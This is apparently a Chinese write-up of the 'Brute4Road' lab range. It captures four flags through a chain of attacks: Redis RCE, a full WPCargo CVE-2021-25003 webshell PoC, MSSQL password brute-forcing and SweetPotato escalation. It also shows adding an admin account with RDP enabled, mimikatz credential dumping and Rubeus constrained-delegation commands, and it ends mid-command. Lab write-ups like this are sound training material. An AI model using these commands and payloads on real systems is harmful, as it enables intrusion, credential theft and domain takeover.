+++
date = '2025-03-17T22:02:55+08:00'
title = '春秋云境-Brute4Road-Writeup'
categories = ["Writeup"]
tags = ["writeup", "渗透", "春秋云镜"]

+++

参考文章

> https://bowuchuling.github.io/posts/chunqiuBrute4Road.html
>
> https://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83
>
> [文章 - 浅谈约束委派攻击 - 先知社区](https://xz.aliyun.com/news/12189#toc-6)





### FLAG1

拿到靶机先用fscan扫一扫

```
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1
[2025-03-17 14:12:55] [INFO] 开始信息扫描
[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1
[2025-03-17 14:12:55] [INFO] 开始主机扫描
[2025-03-17 14:12:55] [INFO] 有效端口数量: 233
[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80
[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22
[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379
[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21
[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 => [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 => [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 => [http] 版本:1.20.1 产品:nginx
[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 => [redis] 版本:5.0.12 产品:Redis key-value store
[2025-03-17 14:13:06] [INFO] 存活端口数量: 4
[2025-03-17 14:13:06] [INFO] 开始漏洞扫描
[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle
[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207      状态码:200 长度:4833   标题:Welcome to CentOS
[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!
[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb
[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379
[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5
```

发现redis不需要密码

那我们连上去

![image-20250317141531955](../assets/image-20250317141531955.png)



redis未授权拿shell的常见利用方法有写webshell，写corn或者写sshkey

这里我先尝试了写corn

![image-20250317142526810](../assets/image-20250317142526810.png)

发现没权限

那同样的也没办法写sshkey

![image-20250317143311383](../assets/image-20250317143311383.png)

看到redis版本为5.0.12

可以打redis主从复制（4.x~5.0.5）

[Redis主从复制getshell技巧 - Bypass - 博客园](https://www.cnblogs.com/xiaozi/p/13089906.html)

生成恶意so文件

```
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
cd RedisModules-ExecuteCommand/
make
```

自动化攻击脚本

```
git clone https://github.com/Ridter/redis-rce.git
cd redis-rce/
cp ../RedisModules-ExecuteCommand/src/module.so ./
pip install -r requirements.txt 
python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
//python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so
```



![image-20250317144701781](../assets/image-20250317144701781.png)

拿到shell之后先上个线

![image-20250317145522117](../assets/image-20250317145522117.png)

```
/home/redis/flag/flag01
```

读flag发现没有权限



尝试suid提权

```shell
[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2>/dev/null
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/sbin/unix_chkpwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chage
/usr/bin/base64
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/pkexec
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

base64可以提权，但是只能读文件

![image-20250317145341222](../assets/image-20250317145341222.png)

```
base64 "/home/redis/flag/flag01" | base64 --decode
```

```
[redis@centos-web01 tmp]$ base64 "/home/redis/flag/flag01" | base64 --decode
 ██████                    ██              ██  ███████                           ██
░█░░░░██                  ░██             █░█ ░██░░░░██                         ░██
░█   ░██  ██████ ██   ██ ██████  █████   █ ░█ ░██   ░██   ██████   ██████       ░██
░██████  ░░██░░█░██  ░██░░░██░  ██░░░██ ██████░███████   ██░░░░██ ░░░░░░██   ██████
░█░░░░ ██ ░██ ░ ░██  ░██  ░██  ░███████░░░░░█ ░██░░░██  ░██   ░██  ███████  ██░░░██
░█    ░██ ░██   ░██  ░██  ░██  ░██░░░░     ░█ ░██  ░░██ ░██   ░██ ██░░░░██ ░██  ░██
░███████ ░███   ░░██████  ░░██ ░░██████    ░█ ░██   ░░██░░██████ ░░████████░░██████
░░░░░░░  ░░░     ░░░░░░    ░░   ░░░░░░     ░  ░░     ░░  ░░░░░░   ░░░░░░░░  ░░░░░░ 


flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}

Congratulations! ! !
Guess where is the second flag?
```

拿到第一个flag



### FLAG2

信息收集一下

看一下ip

```cmd
[redis@centos-web01 tmp]$ ip addr show
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff
    inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0
       valid_lft 315356573sec preferred_lft 315356573sec
    inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 
       valid_lft forever preferred_lft forever
```

fscan扫一下

```shell
[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -nobr
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-03-17 20:10:58] [INFO] 暴力破解线程数: 1
[2025-03-17 20:10:58] [INFO] 开始信息扫描
[2025-03-17 20:10:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255
[2025-03-17 20:10:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)
[2025-03-17 20:10:58] [INFO] 解析CIDR 172.22.2.7/24 -> IP范围 172.22.2.0-172.22.2.255
[2025-03-17 20:10:58] [INFO] 最终有效主机数量: 256
[2025-03-17 20:10:58] [INFO] 开始主机扫描
[2025-03-17 20:10:58] [INFO] 正在尝试无监听ICMP探测...
[2025-03-17 20:10:58] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-03-17 20:10:58] [INFO] 切换为PING方式探测...
[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)
[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)
[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)
[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)
[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)
[2025-03-17 20:11:04] [INFO] 存活主机数量: 5
[2025-03-17 20:11:05] [INFO] 有效端口数量: 233
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:80
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:22
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:22
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:21
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:445
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:389
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:139
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:139
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:135
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:139
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:139
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:135
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:135
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:445
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:445
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:80
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:80
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:88
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:445
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:1433
[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:6379
[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.18:22 => [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]
[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:22 => [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]
[2025-03-17 20:11:05] [SUCCESS] 服务识别 172.22.2.7:21 => [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.7:80 => [http] 版本:1.20.1 产品:nginx
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:445 => 
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:389 => [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:139 =>  Banner:[.]
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:139 =>  Banner:[.]
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:139 =>  Banner:[.]
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.34:445 => 
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:445 => 
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.16:80 => [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows
[2025-03-17 20:11:10] [SUCCESS] 服务识别 172.22.2.3:88 => 
[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.16:1433 => [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]
[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.7:6379 => [redis] 版本:5.0.12 产品:Redis key-value store
[2025-03-17 20:11:11] [SUCCESS] 服务识别 172.22.2.18:80 => [http]
[2025-03-17 20:12:05] [SUCCESS] 服务识别 172.22.2.18:139 => 
[2025-03-17 20:12:06] [SUCCESS] 服务识别 172.22.2.18:445 => 
[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.34:135 => 
[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.16:135 => 
[2025-03-17 20:12:10] [SUCCESS] 服务识别 172.22.2.3:135 => 
[2025-03-17 20:12:10] [INFO] 存活端口数量: 21
[2025-03-17 20:12:10] [INFO] 开始漏洞扫描
[2025-03-17 20:12:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle
[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.3
主机名: DC
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.3
[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found
[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             
[2025-03-17 20:12:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS
[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393
[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.16
主机名: MSSQLSERVER
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.16
[2025-03-17 20:12:10] [SUCCESS] NetInfo 扫描结果
目标主机: 172.22.2.34
主机名: CLIENT01
发现的网络接口:
   IPv4地址:
      └─ 172.22.2.34
[2025-03-17 20:12:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        
[2025-03-17 20:12:11] [SUCCESS] 网站标题 http://172.22.2.18        状态码:200 长度:57738  标题:又一个WordPress站点
[2025-03-17 20:12:13] [SUCCESS] Redis 172.22.2.7:6379 发现未授权访问 文件位置:/usr/local/redis/db/module.so
[2025-03-17 20:12:17] [SUCCESS] Redis无密码连接成功: 172.22.2.7:6379
[2025-03-17 20:12:18] [SUCCESS] 扫描已完成: 37/37
```

扫出来四台机子

```
NetBios 172.22.2.34     XIAORANG\CLIENT01
NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab
NetBios 172.22.2.3      DC:DC.xiaorang.lab
NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02 WordPress
```



**172.22.2.18**上有一个wordpress服务，看看能不能从这里入手



拿wpscan扫一下

```
proxychains4 wpscan --url 172.22.2.18 --api-token my_token
```

扫出来一堆洞

有个能够rce的，感觉比较好利用

```cmd

 | [!] Title: WPCargo < 6.9.0 - Unauthenticated RCE
 |     Fixed in: 6.9.0
 |     References:
 |      - https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-25003
```

找一下漏洞的poc

[WPCargo < 6.9.0 – Unauthenticated RCE | CVE 2021-25003 | Plugin Vulnerabilities](https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a/)

poc

```python
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://127.0.0.1:8001/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))

```

成功RCE，用户是www-data

![image-20250317203216535](../assets/image-20250317203216535.png)

但是靶机不出网，没办法上线

那就直接用蚁剑连

![image-20250317204451034](../assets/image-20250317204451034.png)



在wordpress的配置文件中找到数据库的账号密码

```sql
// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'WpuserEha8Fgj9' );

/** Database hostname */
define( 'DB_HOST', '127.0.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

```
wpuser/WpuserEha8Fgj9
```

这个机子不对外开放端口，所以我们直接用webshell管理器上的数据库管理工具连

![image-20250317205907473](../assets/image-20250317205907473.png)

拿到第二个flag

```
flag{c757e423-eb44-459c-9c63-7625009910d8}
```



### FLAG3

在表S0meth1ng_y0u_m1ght_1ntereSted有一堆密码

不知道有什么用，先导出来

**注意这里用蚁剑导出之前记得将limit去掉，不然密码不全**

![image-20250317210114116](../assets/image-20250317210114116.png)

**172.22.2.16**上有mssql服务

```
NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393
```

用我们手上的这堆密码爆破一下

![image-20250317212152193](../assets/image-20250317212152193.png)

成功拿到账号密码

```
sa/ElGNkOiC
```

接下来直接用mdut连

![image-20250317212417972](../assets/image-20250317212417972.png)

拿到**nt service\mssqlserver**权限

没找到flag，猜测需要提权。

可以用SweetPotato提权
```
C:/Users/Public/sweetpotato.exe -a "whoami"
```

![image-20250317220327866](../assets/image-20250317220327866.png)

拿到第三个flag

```
=====================================

8""""8                           88     8"""8                    
8    8   eeee
e  e   e eeeee eeee 88     8   8  eeeee eeeee eeeee 
8eeee8ee 8   8  8   8   8   8    88  88 8eee8e 8  88 8   8 8   8 
88     8 8eee8e 8e  8   8e  8eee 88ee88 88   8 8   8 8eee8 8e  8 
88     8 88   8 88  8   88  88       88 88   8 8   8 88  8 88  8 
88eeeee8 88   8 88ee8   88  88ee     88 88   8 8eee8 88  8 88ee8 


flag03: flag{6fc1b639-d71c-4c8b-9747-e29074e05a7e}

```



### FLAG4

新建一个用户用rdp连上去

```
net user xrntkk Abc123456 /add
net localgroup administrators xrntkk /add
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

信息收集一下

![image-20250317221808816](../assets/image-20250317221808816.png)

发现这台机子在域内

用bloodhound做一下信息收集

chu0的图，偷过来了![undefined (1)](../assets/undefined (1).png)

从图中我们可以看到，MSSQLSERVER 具有对 DC 的约束性委派权限

我们可以尝试进行约束性委派攻击



#### 什么是约束性委派？

原理大致如下，参考文章：

https://xz.aliyun.com/news/13854

![image-20250317223011253](../assets/image-20250317223011253.png)

![image-20250317223039443](../assets/image-20250317223039443.png)



所以我们接下来就要尝试用mimikatz抓取hash，然后申请TGT，最后伪造S4U请求访问DC

先传一个mimikatz.exe，管理员打开

```
log
privilege::Debug 
sekurlsa::logonpasswords 
exit
```

抓到一个用户hash

```
Authentication Id : 0 ; 95385 (00000000:00017499)
Session           : Service from 0
User Name         : ReportServer
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2025/3/17 19:28:19
SID               : S-1-5-80-2885764129-887777008-271615777-1616004480-2722851051
	msv :	
	 [00000003] Primary
	 * Username : MSSQLSERVER$
	 * Domain   : XIAORANG
	 * NTLM     : 7e7c2b7d5cbee13683f637e721e4a147
	 * SHA1     : d112e5ca3e3c502539058a39f153b432642aec96
	tspkg :	
	wdigest :	
	 * Username : MSSQLSERVER$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : MSSQLSERVER$
	 * Domain   : xiaorang.lab
	 * Password : 6c 8f 64 88 42 1e e5 dc ea 08 1f 03 05 9b e4 a5 50 70 b8 74 77 7b 50 b1 1e 80 d5 4b 0e 79 7c 9b b6 75 53 56 49 19 66 72 a9 d3 50 f8 d3 ab 0e bd e3 14 96 72 a5 fb b5 3f dc d9 ce 37 91 a2 5f d6 a1 2c 39 ea dc f3 80 e6 d2 cd c0 e6 f2 45 cd d1 80 aa f2 7f 47 09 44 ca 7d aa a0 10 c8 3c 5e e0 ae 71 77 f4 f3 1b 13 88 ab 39 68 37 41 43 e0 45 eb 6c 2d f6 fd 67 c6 ac 67 3e dd 56 71 48 b2 ed 7a f8 8c 4f d6 30 67 a2 32 8f 05 a0 2e 65 05 ce af 7d a6 c2 8e d9 c9 fc 31 6b 8e a1 7f 95 0a 2b 68 88 db 11 d9 9c f5 af 68 8c 0e ac 03 93 79 07 59 dd e6 da 42 2c 72 55 8d 3d 35 a9 85 49 90 3f 7b fb 7d b2 72 f7 76 7e ba c5 f0 98 77 fa 18 b2 b4 7c 65 d2 84 b7 8b e3 b2 fe bf 00 92 24 3b 9c b2 98 d3 5b 82 d4 d1 9f b5 aa c9 3b 54 33 26 34 
	ssp :	
	credman :	
```

先用这个账号申请一个TGT

```
Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:7e7c2b7d5cbee13683f637e721e4a147 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap > TGT.txt
```

结果

```

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 7e7c2b7d5cbee13683f637e721e4a147
[*] Building AS-REQ (w/ preauth) for: 'xiaorang.lab\MSSQLSERVER$'
[*] Using domain controller: 172.22.2.3:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDMxNzE1MjQ1N1qmERgPMjAyNTAzMTgwMTI0NTdapxEYDzIwMjUwMzI0MTUyNDU3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==

  ServiceName              :  krbtgt/xiaorang.lab
  ServiceRealm             :  XIAORANG.LAB
  UserName                 :  MSSQLSERVER$ (NT_PRINCIPAL)
  UserRealm                :  XIAORANG.LAB
  StartTime                :  2025/3/17 23:24:57
  EndTime                  :  2025/3/18 9:24:57
  RenewTill                :  2025/3/24 23:24:57
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  gifE8e2s2Hg361IDstjCZA==
  ASREP (key)              :  7E7C2B7D5CBEE13683F637E721E4A147


```

得到base64编码的TGT票据，利用Rubeus导入票据

```
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE241tFjqrNfSoJoWlwylgM3bm183XnDyobdNuAnnh9mSDWS0SeH3+fwYgRMoAEPiDGuFo4fL+kul5qEbaYGfcl14J+SUaXE/f7JTn70xMBMfWdUS7ulBsLcLpx1xdDBgD6tvlkZAD0xrCljRUh2fYuS/5XslPN09EIOjbPDbUbeI5NOjmyFkc1kkkui9vQvTFcAn4LBWsjsmpajvNPYURpguJufgPgPcrDfsLcxdSGWoLeTdzasNYLXCdejYvH465Z56r3k6PbsBDKccsFzIeaTbaud4eHkDlW6O5xlNuQHIkNlp/THSzinnMkAh3T42u3UfxVS5cOyfgeRmkIlHTUFnrbu+Fd2h+pdawCrcedkPOyXR2nbX3iRcL1qul8TbQRInHDyBtr7LrELv+BDYlwWNHV5gB00MhCNXlTcZ6WPLBMoiMAb9LismX6i6wjgVIFpWOAt+Nn/13sz1PTC3akcG+x9GJ9I7iKH48KGNYS38B0KMyJEr402QAaYegGtv2W1vsTiumKxWCL2zOnLq3RLoFY1j72ugPYW1TgbaPrAOz8IWuWPyijEWCV4BxfzCMAHHxwvP3eJeBDRCueYvC85hJO7K5HseG6DOE0OCheBlZF0P7Zy+4su8XjOMPoK1QNcdnaBf/bGb5vci6Hm/sgEOzNtYuD+PjPNysyzge6TbGjCKW/zBCP3rZrkUL6HHby0/yP2KDXb4WZkTZmufLeEOeWYpuUS1j0zMXHIkv9aU7qhhUzznNo80Qq3bD4GSg0eh4JZTsLundidcOq8vbtv9AEfUxAp1yPCyAmB6NtfvACSZBSf7VYHtDQcta5t0DqVJ6h/gpX6uLCjwX0rITkCoUTbcR/+xavKHkWrLboa7XRKp4ZcinRy3kqCGd00qpgtryCduqhduQsMBlEOB7CeVBHTU/pjB/VpmNEWfSQSEx6SuVvf10a/tk9WKLHMukC+PGdEUp8JS3GvIMAmd3ZtC0SD0UXCZrDUhqdMs2ZjTNT4T+cBsdsdhEEt4cWq7Liktit+DR9DcJ0v6NNAQRHJA1htumPpNRsrn4YyEbjZwYuBxnJbH2rAqF1CwKsPOCtQIQhs90Fj9lz7v2ESjCXDxKm43qjwYiopWKy+4vqKNtzdcymFPme9HVPuFCnj/UwwYibvuXgwQZaNytazMd8N79wOVm3TK6TqblZUL9DaWMgBAAG5ORsUPFIaeM8XkuMwRPMX4cte7MuxK5TwOfNAOjWBBG1sIG1hit3eFXLkNWUuPLI5I2xh4YwFefKIY9p/8j3hQKga2CAU6bJDUYu3HNbHZyT9eQi1xi1KQbKUerFE+I5efaISQmVixkYGlSPIyQpGIFQdT8KeV84giD2Jefxty8Ik2W/8TGh8b2bn4bWJ1g8iMgzuurzbUEZjlf9mSWRdg8qU4PxsXcbf4Bk253/mclXVFCNojLz1RLVoj6TtJAIFw+IJG39dvcCjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBCCJ8Tx7azYeDfrUgOy2MJkoQ4bDFhJQU9S